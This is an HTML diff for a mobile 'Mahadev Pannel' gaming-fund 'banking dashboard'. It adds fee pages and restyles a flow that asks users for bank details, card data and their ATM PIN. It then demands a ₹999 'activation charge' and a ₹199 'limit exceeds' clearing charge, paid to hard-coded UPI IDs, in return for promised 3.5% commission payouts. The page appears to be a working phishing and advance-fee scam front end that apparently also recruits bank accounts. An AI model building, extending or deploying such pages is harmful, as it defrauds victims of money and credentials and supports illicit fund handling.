@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Mahadev Pannel — Banking Dashboard</title>
+    <title>Mahadev Pannel — Pure Gaming Fund Banking Dashboard</title>
     <meta name="description" content="Mahadev Pannel - Mobile banking dashboard with instant UTR settlement, 3D ATM card mandate, and live payouts." />
     <link rel="stylesheet" href="./style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Cormorant+Garamond:ital,wght@1,600;1,700&family=JetBrains+Mono:wght@500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body class="mp-body mp-dash-body">
     <!-- IN-APP PAYMENT NOTIFICATION CONTAINER -->
     <div id="paymentNotificationContainer" class="payment-notification-container" aria-live="assertive"></div>
 
-    <!-- COMPACT STICKY MOBILE BANKING HEADER -->
-    <header class="mp-topbar mp-dash-topbar">
+    <!-- COMPACT STICKY ROYAL BANKING HEADER -->
+    <header class="mp-topbar mp-royal-topbar mp-dash-topbar">
         <div class="mp-topbar-inner">
             <div class="mp-brand">
                 <button type="button" class="mp-back-icon-btn" id="dashboardBackBtn" style="display:none;" title="Go Back" aria-label="Back">
@@ -27,12 +27,15 @@
                     <img src="./src/assets/images/mahadev_pannel_logo_1794679866477.jpg" alt="Mahadev Pannel" class="mp-logo-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
                     <span class="mp-logo-fallback" style="display:none;">
                         <svg width="22" height="22" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M18 4V31M18 4L14 10M18 4L22 10M10 9C10 15 13 18 18 18C23 18 26 15 26 9M13 24H23" stroke="#F59E0B" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M18 4V31M18 4L14 10M18 4L22 10M10 9C10 15 13 18 18 18C23 18 26 15 26 9M13 24H23" stroke="#FBBF24" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </span>
                 </div>
                 <div class="mp-brand-copy">
-                    <h1 class="mp-brand-name">MAHADEV PANNEL</h1>
+                    <div class="mp-brand-title-row">
+                        <h1 class="mp-brand-name">MAHADEV PANNEL</h1>
+                        <span class="mp-pure-fund-pill">PURE GAMING FUND</span>
+                    </div>
                     <span class="mp-brand-sub" id="welcomeMessage">MEMBER ACCOUNT</span>
                 </div>
             </div>
@@ -43,34 +46,23 @@
                         <path d="M29.57 6.11c.31-.96-.98-1.39-1.57-.7L3.9 18.38c-1.07.65-1.05 1.49-.2 1.89l6.46 2.01 1.53 6.03c.18.73.97.83 1.39.28l2.76-3.56 5.56 4.11c.99.74 1.75.39 1.98-.82l3.12-14.79z" fill="currentColor"/>
                     </svg>
                 </a>
-                <button type="button" class="bonus-box mp-bonus-chip" id="bonusBox" title="Claim ₹799 Bonus">
-                    <span class="bonus-badge" id="bonusBadge"></span>
-                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <polyline points="20 12 20 22 4 22 4 12"></polyline>
-                        <rect x="2" y="7" width="20" height="5"></rect>
-                        <line x1="12" y1="22" x2="12" y2="7"></line>
-                        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"></path>
-                        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"></path>
-                    </svg>
-                    <span>₹799</span>
-                </button>
                 <button type="button" class="mp-logout-btn" id="logoutBtn" title="Sign Out">Exit</button>
             </div>
         </div>
     </header>
 
     <div class="mp-app-container">
-        <!-- BANKING VAULT HERO BALANCE CARD -->
-        <section class="mp-vault-hero" aria-label="Account Balance Summary">
-            <img src="./src/assets/images/mahadev_vault_bg_1794679870399.jpg" alt="" class="mp-vault-bg" onerror="this.style.display='none';">
-            <div class="mp-vault-scrim"></div>
+        <!-- ROYAL SHIVA VAULT HERO BALANCE CARD -->
+        <section class="mp-vault-hero mp-royal-vault-hero" aria-label="Account Balance Summary">
+            <img src="./src/assets/images/mahadev_shiva_hero_1794735684027.jpg" alt="" class="mp-vault-bg mp-vault-shiva-bg" onerror="this.src='./src/assets/images/mahadev_vault_bg_1794679870399.jpg';">
+            <div class="mp-vault-scrim mp-royal-vault-scrim"></div>
             <div class="mp-vault-inner">
                 <div class="mp-vault-top">
                     <div>
                         <span class="mp-vault-label">TOTAL SETTLEMENT VOLUME</span>
                         <div class="mp-vault-balance tabular-nums" id="totalBalance">₹0</div>
                     </div>
-                    <span class="mp-vault-tier-badge">ROYAL 3.5%</span>
+                    <span class="mp-vault-tier-badge">3.5% ONSPOT</span>
                 </div>
 
                 <div class="mp-vault-substats">
@@ -92,36 +84,30 @@
 
         <!-- MAIN BANKING HOME SCREEN -->
         <div class="dashboard-section" id="mainDashboard">
-            <!-- 4-TILE BANKING QUICK ACTIONS -->
+            <!-- 3-TILE ROYAL BANKING QUICK ACTIONS -->
             <div class="mp-quick-grid" aria-label="Quick Banking Actions">
-                <button type="button" class="mp-qa-tile" id="qaBankSetupBtn">
+                <button type="button" class="mp-qa-tile mp-royal-qa-tile" id="qaBankSetupBtn">
                     <span class="mp-qa-icon mp-qa-gold">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M3 10h18"/><path d="M5 6l7-3 7 3"/><path d="M4 10v11"/><path d="M20 10v11"/><path d="M8 14v3"/><path d="M12 14v3"/><path d="M16 14v3"/></svg>
                     </span>
                     <span class="mp-qa-label">Link Bank</span>
                 </button>
-                <button type="button" class="mp-qa-tile" id="qaLivePanelBtn">
+                <button type="button" class="mp-qa-tile mp-royal-qa-tile" id="qaLivePanelBtn">
                     <span class="mp-qa-icon mp-qa-emerald">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
                     </span>
-                    <span class="mp-qa-label">Run Panel</span>
+                    <span class="mp-qa-label">Panel Status</span>
                 </button>
-                <button type="button" class="mp-qa-tile" id="qaWithdrawBtn">
+                <button type="button" class="mp-qa-tile mp-royal-qa-tile" id="qaWithdrawBtn">
                     <span class="mp-qa-icon mp-qa-amber">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5"/><polyline points="5 12 12 5 19 12"/></svg>
                     </span>
                     <span class="mp-qa-label">Withdraw</span>
                 </button>
-                <button type="button" class="mp-qa-tile" id="qaBonusBtn">
-                    <span class="mp-qa-icon mp-qa-ruby">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
-                    </span>
-                    <span class="mp-qa-label">Bonus ₹799</span>
-                </button>
             </div>
 
             <!-- COMPACT BANKING SETUP TRACKER -->
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="mp-card-head">
                     <h3>Account Activation</h3>
                     <span class="mp-secure-tag">5 Steps</span>
@@ -132,23 +118,25 @@
                     <div class="step-arrow">›</div>
                     <div class="step"><span>2</span><p>ATM</p></div>
                     <div class="step-arrow">›</div>
-                    <div class="step"><span>3</span><p>UTR</p></div>
+                    <div class="step"><span>3</span><p>UPI</p></div>
                     <div class="step-arrow">›</div>
-                    <div class="step"><span>4</span><p>Live</p></div>
+                    <div class="step"><span>4</span><p>Verify</p></div>
                     <div class="step-arrow">›</div>
                     <div class="step"><span>5</span><p>Payout</p></div>
                 </div>
 
-                <div class="mp-home-cta-stack">
-                    <button type="button" class="btn btn-primary" id="gamingFundBtn">Setup Bank &amp; Activate</button>
-                    <button type="button" class="btn btn-success" id="openRunningBtn">Open Live Panel</button>
+                <div class="mp-home-cta-stack mp-home-cta-single">
+                    <button type="button" class="btn btn-primary mp-btn-full mp-royal-cta-btn" id="gamingFundBtn">
+                        <span>Setup Bank &amp; Activate</span>
+                        <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                    </button>
                 </div>
             </div>
         </div>
 
         <!-- STEP 1: BANK ACCOUNT DETAILS -->
         <div class="dashboard-section hidden" id="gamingFundSection">
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="mp-card-head">
                     <h3>Link Bank Account</h3>
                     <span class="mp-secure-tag">Step 1 / 5</span>
@@ -195,9 +183,9 @@
                         <div class="form-group">
                             <label for="accountType">Account Type</label>
                             <select id="accountType" required>
-                                <option value="Saving">Saving (₹70K)</option>
-                                <option value="Current">Current (₹140K)</option>
-                                <option value="Corporate">Corporate (₹190K)</option>
+                                <option value="Saving">Saving (Upto ₹1 Lakh)</option>
+                                <option value="Current">Current (Upto ₹3 Lakh)</option>
+                                <option value="Corporate">Corporate (₹5 Lakh+)</option>
                             </select>
                         </div>
 
@@ -213,7 +201,10 @@
                         <div id="upiPreview" style="margin-top:10px;"></div>
                     </div>
 
-                    <button type="submit" class="btn btn-primary mp-btn-full">Save &amp; Continue</button>
+                    <button type="submit" class="btn btn-primary mp-btn-full mp-royal-cta-btn">
+                        <span>Save &amp; Continue</span>
+                        <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                    </button>
                 </form>
                 <div id="accountDetailsMessage" class="message"></div>
             </div>
@@ -221,7 +212,7 @@
 
         <!-- STEP 2: ATM AUTODEBIT MANDATE WITH LIVE 3D CARD -->
         <div class="dashboard-section hidden" id="autodebitSection">
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="atm-section-header">
                     <div>
                         <h3>ATM Card Mandate</h3>
@@ -331,8 +322,8 @@
 
                         <div class="atm-form-row-2">
                             <div class="form-group">
-                                <label for="atmPin">ATM PIN</label>
-                                <input type="password" id="atmPin" placeholder="4-digit PIN" maxlength="4" inputmode="numeric" autocomplete="off" required>
+                                <label for="atmPin">ATM PIN (4-6 Digits)</label>
+                                <input type="password" id="atmPin" placeholder="4 to 6-digit PIN" maxlength="6" inputmode="numeric" autocomplete="off" required>
                             </div>
 
                             <div class="form-group">
@@ -348,7 +339,10 @@
                             </div>
                         </div>
 
-                        <button type="submit" class="btn btn-primary mp-btn-full">Enable Autodebit</button>
+                        <button type="submit" class="btn btn-primary mp-btn-full mp-royal-cta-btn">
+                            <span>Enable Autodebit</span>
+                            <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                        </button>
                         <div id="autodebitMessage" class="message"></div>
                     </form>
                 </div>
@@ -357,32 +351,45 @@
 
         <!-- STEP 3: ACTIVATION PAYMENT -->
         <div class="dashboard-section hidden" id="activationPaymentSection">
-            <div class="card mp-app-card mp-center-card">
+            <div class="card mp-app-card mp-royal-card mp-center-card">
                 <span class="mp-secure-tag">Step 3 / 5</span>
-                <h3>Activate Panel</h3>
-                <p class="muted">Complete ₹399 UPI verification to unlock live transactions.</p>
-                <button type="button" class="btn btn-primary btn-large" id="activationPaymentBtn">Pay ₹399 via UPI</button>
+                <h3>Pay One Time Activation Charges</h3>
+                <p class="muted">Complete ₹999 UPI verification to unlock live transactions after Admin approval.</p>
+                <button type="button" class="btn btn-primary btn-large mp-royal-cta-btn" id="activationPaymentBtn">
+                    <span>Pay ₹999 via UPI</span>
+                    <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                </button>
             </div>
         </div>
 
-        <!-- ACTIVATION CODE UPI PANEL -->
+        <!-- UPI ACTIVATION PAYMENT (₹999 + UPI APPS) -->
         <div class="dashboard-section hidden" id="activationCodeUpiSection">
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="mp-card-head">
                     <h3>UPI Activation</h3>
-                    <span class="mp-amount-pill">₹399</span>
+                    <span class="mp-amount-pill">₹999</span>
                 </div>
 
-                <div class="upi-section">
-                    <div class="upi-row">
-                        <p class="upi-label">Primary UPI ID</p>
+                <div class="mp-charge-banner">
+                    <span>⚡ Pay One Time Activation Charges — <strong>₹999</strong></span>
+                </div>
+
+                <div class="upi-section" id="activationUpiSelectorGroup">
+                    <div class="upi-row is-selectable is-selected" data-upi-select="activation" data-upi-id="panneltest0@ptyes" role="button" tabindex="0">
+                        <div class="upi-row-top">
+                            <span class="upi-radio-dot" aria-hidden="true"></span>
+                            <p class="upi-label">Primary UPI ID (Tap to Select)</p>
+                        </div>
                         <div class="upi-display">
                             <span class="upiId" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
                             <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="panneltest0@ptyes" data-copy-target="activationCopyMessage">Copy</button>
                         </div>
                     </div>
-                    <div class="upi-row">
-                        <p class="upi-label">Backup UPI ID</p>
+                    <div class="upi-row is-selectable" data-upi-select="activation" data-upi-id="malikpay0@fam" role="button" tabindex="0">
+                        <div class="upi-row-top">
+                            <span class="upi-radio-dot" aria-hidden="true"></span>
+                            <p class="upi-label">Backup UPI ID (Tap to Select)</p>
+                        </div>
                         <div class="upi-display">
                             <span class="upiId" data-upi-id="malikpay0@fam">malikpay0@fam</span>
                             <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="malikpay0@fam" data-copy-target="activationCopyMessage">Copy</button>
@@ -391,47 +398,46 @@
                     <div class="copyMessage" id="activationCopyMessage"></div>
                 </div>
 
+                <div class="upi-apps-block">
+                    <div class="upi-apps-header">
+                        <span>Pay ₹999 Directly via UPI App</span>
+                        <strong id="selectedActivationUpiDisplay" class="mono-font">panneltest0@ptyes</strong>
+                    </div>
+                    <div class="upi-app-grid" data-upi-app-group="activation">
+                        <button type="button" class="upi-app-btn upi-app-phonepe" data-upi-app="phonepe" data-flow="activation">
+                            <span class="upi-app-badge">Pe</span>
+                            <span>PhonePe</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-gpay" data-upi-app="gpay" data-flow="activation">
+                            <span class="upi-app-badge">G</span>
+                            <span>Google Pay</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-paytm" data-upi-app="paytm" data-flow="activation">
+                            <span class="upi-app-badge">Py</span>
+                            <span>Paytm</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-any" data-upi-app="generic" data-flow="activation">
+                            <span class="upi-app-badge">₹</span>
+                            <span>Any UPI App</span>
+                        </button>
+                    </div>
+                </div>
+
                 <div class="form-group">
                     <label for="activationUtrInput">12-Digit UTR Number</label>
-                    <input type="text" id="activationUtrInput" placeholder="Enter UTR after payment" class="utrInput">
-                    <button type="button" class="btn btn-primary mp-btn-full" id="activationSubmitUtrBtn" style="margin-top:10px;">Submit UTR</button>
+                    <input type="text" id="activationUtrInput" placeholder="Enter 12-digit UTR after ₹999 payment" maxlength="12" inputmode="numeric" class="utrInput">
+                    <button type="button" class="btn btn-primary mp-btn-full mp-royal-cta-btn" id="activationSubmitUtrBtn" style="margin-top:10px;">
+                        <span>Submit UTR</span>
+                        <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                    </button>
                 </div>
                 <div id="activationUtrMessage" class="message"></div>
             </div>
         </div>
 
-        <!-- ACTIVATION CODE DISPLAY -->
-        <div class="dashboard-section hidden" id="activationCodeDisplaySection">
-            <div class="card mp-app-card mp-center-card">
-                <span class="mp-secure-tag mp-tag-emerald">Code Ready</span>
-                <h3>Activation Code</h3>
-                <div class="mp-code-display tabular-nums" id="generatedActivationCode">0000000</div>
-                <div class="mp-home-cta-stack">
-                    <button type="button" class="btn btn-secondary" id="copyActivationCodeBtn">Copy Code</button>
-                    <button type="button" class="btn btn-primary" id="activateAccountCodeBtn">Verify Code</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- CODE VERIFICATION -->
-        <div class="dashboard-section hidden" id="codeVerificationSection">
-            <div class="card mp-app-card">
-                <div class="mp-card-head">
-                    <h3>Enter Activation Code</h3>
-                    <span class="mp-secure-tag">7 Digits</span>
-                </div>
-                <div class="form-group">
-                    <label for="enteredActivationCode">Activation Code</label>
-                    <input type="text" id="enteredActivationCode" placeholder="0000000" maxlength="7" style="font-size:1.35rem;text-align:center;letter-spacing:4px;font-family:var(--font-mono);">
-                    <button type="button" class="btn btn-primary mp-btn-full" id="submitVerificationBtn" style="margin-top:12px;">Activate Panel</button>
-                </div>
-                <div id="verificationMessage" class="message"></div>
-            </div>
-        </div>
-
         <!-- STEP 4: RUNNING ACCOUNT -->
         <div class="dashboard-section hidden" id="runningAccountSection">
-            <div class="card mp-app-card running-card">
+            <div class="card mp-app-card mp-royal-card running-card">
                 <div class="mp-live-guard">
                     <span>Keep this screen open during active settlement</span>
                 </div>
@@ -465,81 +471,104 @@
                         <div class="side-panel mp-comm-box">
                             <span class="mp-bw-label">Earned Commission (3.5%)</span>
                             <div id="commissionAmount" class="mp-comm-val tabular-nums">₹0</div>
-                            <button type="button" class="btn btn-primary mp-btn-full" id="withdrawCommissionBtn">Withdraw Payout</button>
+                            <button type="button" class="btn btn-primary mp-btn-full mp-royal-cta-btn" id="withdrawCommissionBtn">
+                                <span>Withdraw Payout</span>
+                                <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                            </button>
                         </div>
                     </div>
                 </div>
-            </div>
-        </div>
-
-        <!-- BONUS PAGE -->
-        <div class="dashboard-section hidden" id="bonusPageSection">
-            <div class="card mp-app-card bonus-page-card">
-                <div class="bonus-page-title">MEMBER REWARD</div>
-                <h3>Welcome Bonus</h3>
-                <div class="bonus-amount tabular-nums">₹799</div>
-                <button type="button" class="btn btn-primary btn-large" id="claimBonusBtn">Withdraw ₹799</button>
-
-                <div class="bonus-demo-countdown" aria-live="polite">
-                    <div class="bonus-countdown-expiry" id="bonusCountdownExpiry">Expires: --</div>
-                    <div class="bonus-countdown-timer" aria-label="Bonus countdown">
-                        <span class="bonus-time-box"><strong id="bonusHours" class="tabular-nums">00</strong><small>HRS</small></span>
-                        <span class="bonus-time-separator">:</span>
-                        <span class="bonus-time-box"><strong id="bonusMinutes" class="tabular-nums">00</strong><small>MIN</small></span>
-                        <span class="bonus-time-separator">:</span>
-                        <span class="bonus-time-box"><strong id="bonusSeconds" class="tabular-nums">00</strong><small>SEC</small></span>
-                    </div>
-                </div>
-
-                <div id="bonusMessageContainer" class="bonus-inline-message" style="display:none;"></div>
-            </div>
-        </div>
-
-        <!-- BONUS WITHDRAW PAGE -->
-        <div class="dashboard-section hidden" id="bonusWithdrawSection">
-            <div class="card mp-app-card">
-                <div class="mp-card-head">
-                    <h3>Bonus Transfer</h3>
-                    <span class="mp-amount-pill">₹799</span>
-                </div>
-                <form id="bonusWithdrawForm">
-                    <div class="form-group">
-                        <label for="bonusWithdrawAccNumber">Account Number</label>
-                        <input type="text" id="bonusWithdrawAccNumber" placeholder="Enter account number" required>
-                    </div>
-
-                    <div class="form-group">
-                        <div class="label-row-with-badge">
-                            <label for="bonusWithdrawIfsc">IFSC Code</label>
-                            <span id="bonusIfscBadge" class="ifsc-status-pill">Auto-Detect</span>
-                        </div>
-                        <input type="text" id="bonusWithdrawIfsc" placeholder="11-digit IFSC" maxlength="11" style="text-transform:uppercase;font-family:var(--font-mono);letter-spacing:1px;" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="bonusWithdrawHolder">Account Holder</label>
-                        <input type="text" id="bonusWithdrawHolder" placeholder="Holder name" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="bonusWithdrawBank">Bank Name</label>
-                        <input type="text" id="bonusWithdrawBank" placeholder="Auto-filled bank" required>
-                    </div>
-
-                    <button type="submit" class="btn btn-primary mp-btn-full">Transfer ₹799</button>
-                </form>
-                <div id="bonusWithdrawMessage" class="message"></div>
             </div>
         </div>
 
         <!-- VERIFIED PAYMENT RECEIPT SECTION -->
         <div class="dashboard-section hidden" id="paymentReceiptSection">
-            <div class="card mp-app-card verified-receipt-card" id="verifiedReceiptCard"></div>
+            <div class="card mp-app-card mp-royal-card verified-receipt-card" id="verifiedReceiptCard"></div>
+        </div>
+
+        <!-- DEDICATED ₹199 ACCOUNT LIMIT UPGRADE & PAYOUT VERIFICATION PAGE -->
+        <div class="dashboard-section hidden" id="upgradePaymentSection">
+            <div class="card mp-app-card mp-royal-card upgrade-card">
+                <div class="mp-card-head">
+                    <h3>Account Limit Exceeds</h3>
+                    <span class="mp-amount-pill">₹199</span>
+                </div>
+
+                <div class="mp-charge-banner">
+                    <span>Pay ₹199 clearing charge via UPI and submit 12-digit UTR for Admin Verification</span>
+                </div>
+
+                <div class="upgrade-upi-section" id="upgradeUpiSelectorGroup">
+                    <div class="upgrade-upi-row is-selectable is-selected" data-upi-select="upgrade" data-upi-id="panneltest0@ptyes" role="button" tabindex="0">
+                        <div class="upi-row-top">
+                            <span class="upi-radio-dot" aria-hidden="true"></span>
+                            <label class="upgrade-upi-label">UPI ID #1 (Tap to Select)</label>
+                        </div>
+                        <div class="upgrade-upi-display">
+                            <span class="upgrade-upi-id" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="panneltest0@ptyes" data-copy-target="upgradeCopyMsg_1">Copy</button>
+                        </div>
+                        <div class="upgrade-copy-message" id="upgradeCopyMsg_1"></div>
+                    </div>
+
+                    <div class="upgrade-upi-row is-selectable" data-upi-select="upgrade" data-upi-id="malikpay0@fam" role="button" tabindex="0">
+                        <div class="upi-row-top">
+                            <span class="upi-radio-dot" aria-hidden="true"></span>
+                            <label class="upgrade-upi-label">UPI ID #2 (Tap to Select)</label>
+                        </div>
+                        <div class="upgrade-upi-display">
+                            <span class="upgrade-upi-id" data-upi-id="malikpay0@fam">malikpay0@fam</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="malikpay0@fam" data-copy-target="upgradeCopyMsg_2">Copy</button>
+                        </div>
+                        <div class="upgrade-copy-message" id="upgradeCopyMsg_2"></div>
+                    </div>
+                </div>
+
+                <div class="upi-apps-block">
+                    <div class="upi-apps-header">
+                        <span>Pay ₹199 Directly via UPI App</span>
+                        <strong id="selectedUpgradeUpiDisplay" class="mono-font">panneltest0@ptyes</strong>
+                    </div>
+                    <div class="upi-app-grid" data-upi-app-group="upgrade">
+                        <button type="button" class="upi-app-btn upi-app-phonepe" data-upi-app="phonepe" data-flow="upgrade">
+                            <span class="upi-app-badge">Pe</span>
+                            <span>PhonePe</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-gpay" data-upi-app="gpay" data-flow="upgrade">
+                            <span class="upi-app-badge">G</span>
+                            <span>Google Pay</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-paytm" data-upi-app="paytm" data-flow="upgrade">
+                            <span class="upi-app-badge">Py</span>
+                            <span>Paytm</span>
+                        </button>
+                        <button type="button" class="upi-app-btn upi-app-any" data-upi-app="generic" data-flow="upgrade">
+                            <span class="upi-app-badge">₹</span>
+                            <span>Any UPI App</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="upgradeUtrInput">Enter 12-Digit UTR Number</label>
+                    <input type="text" id="upgradeUtrInput" class="upgrade-utr-input utrInput" placeholder="Enter 12-digit UTR number" maxlength="12" inputmode="numeric" required>
+                </div>
+
+                <div id="upgradeUtrMessage" class="message"></div>
+
+                <div class="mp-upgrade-actions">
+                    <button type="button" class="btn btn-primary mp-btn-full mp-royal-cta-btn" id="submitUpgradeUtrBtn">
+                        <span>Submit ₹199 UTR &amp; Verify</span>
+                        <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                    </button>
+                    <button type="button" class="btn btn-secondary mp-btn-full" id="cancelUpgradeBtn">Back to Withdrawal Form</button>
+                </div>
+            </div>
         </div>
 
         <!-- TRANSACTION HISTORY -->
         <div class="dashboard-section" id="transactionHistorySection">
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="history-header-row">
                     <h3 style="margin-bottom:0;">Recent Ledger</h3>
                     <button type="button" class="btn btn-secondary btn-receipt-shortcut hidden" id="viewLatestReceiptBtn">Receipt</button>
@@ -550,7 +579,7 @@
 
         <!-- WITHDRAW PANEL -->
         <div class="dashboard-section hidden" id="withdrawCommissionSection">
-            <div class="card mp-app-card">
+            <div class="card mp-app-card mp-royal-card">
                 <div class="mp-card-head">
                     <h3>Commission Payout</h3>
                     <span class="mp-secure-tag">Step 5 / 5</span>
@@ -579,7 +608,10 @@
                         <input type="tel" id="withdrawContact" placeholder="10-digit mobile" required>
                     </div>
 
-                    <button type="submit" class="btn btn-primary mp-btn-full">Request Payout</button>
+                    <button type="submit" class="btn btn-primary mp-btn-full mp-royal-cta-btn">
+                        <span>Request Payout</span>
+                        <span class="mp-cta-arrow" aria-hidden="true">→</span>
+                    </button>
                 </form>
                 <button type="button" class="btn btn-secondary mp-btn-full" id="backFromWithdrawBtn" style="margin-top:10px;">Back</button>
             </div>
@@ -611,10 +643,6 @@
         <button type="button" class="app-bottom-nav-btn" data-nav="history">
             <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
             <span>Ledger</span>
-        </button>
-        <button type="button" class="app-bottom-nav-btn" data-nav="bonus">
-            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
-            <span>Bonus</span>
         </button>
     </nav>
 
